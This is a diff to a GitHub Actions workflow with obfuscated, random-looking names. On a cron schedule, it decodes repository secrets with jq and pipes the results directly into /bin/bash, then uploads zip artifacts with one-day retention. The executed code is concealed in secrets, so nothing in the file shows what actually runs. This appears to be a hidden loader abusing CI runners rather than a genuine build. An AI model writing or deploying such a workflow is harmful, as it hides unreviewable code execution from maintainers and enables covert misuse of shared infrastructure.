@@ -1,27 +1,29 @@
 name: richardfactory2548
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '13 4/6 * * *'
+    - cron: '20 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: richardfactory2548
         env:
-          lkiug5063: ${{ secrets.lkiug5063 }}
+          lvyux57: ${{ secrets.lvyux57 }}
         run: |
-          echo $lkiug5063 | jq -r .xdc2365 | /bin/bash
-          echo $uxi4 | jq -r .i999 | /bin/bash
-          echo $colh3452 | jq -r .dqi4 | /bin/bash
-          echo $fm4296 | jq -r .zu4144 | /bin/bash
-          echo $ocfm50506 | jq -r .nvym381 | /bin/bash
-          echo $exwq6 | jq -r .qfdty5176 | /bin/bash
-          echo $b1 | jq -r .pwq292 | /bin/bash
-          echo $p85 | jq -r .czlls98612 | /bin/bash
-          echo $ugask57661 | jq -r .elq0226 | /bin/bash
-          echo $mmk3681 | jq -r .j278 | /bin/bash
+          printf '%s' "$lvyux57" | jq -r .or7 | /bin/bash
+          printf '%s' "$o84" | jq -r .onmo11 | /bin/bash
+          printf '%s' "$s33" | jq -r .w690 | /bin/bash
+          echo $in1 | jq -r .rpgy95928 | /bin/bash
+          echo $ytu648 | jq -r .q3745 | /bin/bash
+          printf '%s' "$tql15" | jq -r .pcdyu36 | /bin/bash
+          printf '%s' "$zd7333" | jq -r .j241 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: s5n5w34S
+          path: "*.zip"
+          retention-days: 1
